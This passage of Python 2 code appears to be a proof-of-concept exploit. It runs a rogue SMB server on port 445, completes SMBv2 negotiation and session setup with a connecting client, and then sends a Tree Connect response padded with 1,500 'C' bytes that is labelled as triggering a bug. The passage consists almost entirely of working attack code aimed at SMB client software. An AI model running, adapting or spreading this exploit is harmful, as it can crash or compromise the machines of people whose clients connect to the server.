                head = SMBv2Header(CreditCharge="\x00\x00",Credits="\x01\x00",PID="\x00\x00\x00\x00")
                t = SMB2NegoAns()
                t.calculate()
                packet1 = str(head)+str(t)
                buffer1 = longueur(packet1)+packet1  
                print "[*]Negotiating SMBv2."
                self.request.send(buffer1)
                data = self.request.recv(1024)

              if data[16:18] == "\x00\x00":
                CreditsRequested = data[18:20]
                if CreditsRequested == "\x00\x00":
                   CreditsRequested =  "\x01\x00"
                CreditCharged = data[10:12]
                head = SMBv2Header(MessageId=GrabMessageID(data), PID="\xff\xfe\x00\x00", CreditCharge=GrabCreditCharged(data), Credits=GrabCreditRequested(data))
                t = SMB2NegoAns(Dialect="\x02\x02")
                t.calculate()
                packet1 = str(head)+str(t)
                buffer1 = longueur(packet1)+packet1  
                print "[*]Negotiate Protocol SMBv2 packet sent."
                self.request.send(buffer1)
                data = self.request.recv(1024)

              #Session More Work to Do
              if data[16:18] == "\x01\x00":
                head = SMBv2Header(Cmd="\x01\x00", MessageId=GrabMessageID(data), PID="\xff\xfe\x00\x00", CreditCharge=GrabCreditCharged(data), Credits=GrabCreditRequested(data), SessionID="\x4d\x00\x00\x00\x00\x04\x00\x00",NTStatus="\x16\x00\x00\xc0")
                t = SMB2Session1Data()
                t.calculate()
                packet1 = str(head)+str(t)
                buffer1 = longueur(packet1)+packet1
                print "[*]Session challenge SMBv2 packet sent."
                self.request.send(buffer1)
                data = self.request.recv(1024)

              #Session Positive
              if data[16:18] == "\x01\x00" and GrabMessageID(data)[0:1] == "\x02":
                head = SMBv2Header(Cmd="\x01\x00", MessageId=GrabMessageID(data), PID="\xff\xfe\x00\x00", CreditCharge=GrabCreditCharged(data), Credits=GrabCreditRequested(data), NTStatus="\x00\x00\x00\x00", SessionID=GrabSessionID(data))
                t = SMB2SessionAcceptData()
                t.calculate()
                packet1 = str(head)+str(t)
                buffer1 = longueur(packet1)+packet1
                self.request.send(buffer1)
                data = self.request.recv(1024)

              ## Tree Connect
              if data[16:18] == "\x03\x00":
                head = SMBv2Header(Cmd="\x03\x00", MessageId=GrabMessageID(data), PID="\xff\xfe\x00\x00", TID="\x01\x00\x00\x00", CreditCharge=GrabCreditCharged(data), Credits=GrabCreditRequested(data), NTStatus="\x00\x00\x00\x00", SessionID=GrabSessionID(data))
                t = SMB2TreeData(Data="C"*1500)#//BUG
                packet1 = str(head)+str(t)
                buffer1 = longueur(packet1)+packet1
                print "[*]Triggering Bug; Tree Connect SMBv2 packet sent."
                self.request.send(buffer1)
                data = self.request.recv(1024)

        except Exception:
           print "Disconnected from", self.client_address
           pass

SocketServer.TCPServer.allow_reuse_address = 1
launch = SocketServer.TCPServer(('', 445),SMB2)
launch.serve_forever()